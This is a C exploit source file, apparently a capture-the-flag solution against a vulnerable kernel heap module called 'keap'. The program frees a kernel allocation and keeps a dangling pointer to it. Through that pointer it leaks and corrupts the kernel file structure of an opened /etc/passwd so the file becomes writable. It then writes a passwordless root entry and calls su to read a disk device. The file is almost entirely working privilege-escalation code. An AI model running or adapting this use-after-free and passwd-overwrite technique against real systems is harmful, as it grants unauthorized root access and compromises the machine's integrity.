#include <unistd.h>
#include <stdbool.h>

#include "libs/pwn.h"

/*******************************
 * EXPLOIT                     *
 *******************************/

#define FILE_SIZE   0x100
#define VAL_PATH    0x0008400000000000
#define VAL_RDONLY  0x000a800d00000000
#define VAL_RDWR    0x000f800f00000000
#define VAL_MASK    0x000f000f00000000

char clear[FILE_SIZE] = {0};

int main(int argc, char* argv[]) {
  void *ptr;
  bool found;
  int fd;
  uint64_t leak[FILE_SIZE / sizeof(uint64_t)] = {0};

  puts("[+] INIT");

  fd = SYSCHK(open("/tmp/a", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
  SYSCHK(close(fd));
  
  init();

  puts("[+] created dangeling ptrs");

  ptr = keap_malloc(FILE_SIZE, GFP_KERNEL);
  keap_write(ptr, clear, FILE_SIZE);
  keap_free(ptr);
  printf("[+] dangeling ptr: %p\n", ptr);

  fd = SYSCHK(open("/etc/passwd", O_RDONLY));

  keap_read(ptr, leak, FILE_SIZE);

#ifdef DEBUG
  print_hex((char*) leak, FILE_SIZE);
#endif

  puts("[+] corrupt /etc/passwd to make O_RDWR"); 
  // is guessable, but this increases successrate
  leak[2] &= ~VAL_MASK;
  leak[2] |= VAL_RDWR & VAL_MASK;

  keap_write(ptr, leak, FILE_SIZE);

  found = false;
  puts("[+] write to corrupted /etc/passwd"); 
  SYSCHK(write(fd, "root::0:0:root:/root:/bin/sh\n", 29));

  puts("[+] Finished! Reading Flag");
  puts("=======================");
  SYSCHK(system("su -c 'cat /dev/sda'"));

  puts("[+] END");

  return 0;  
}
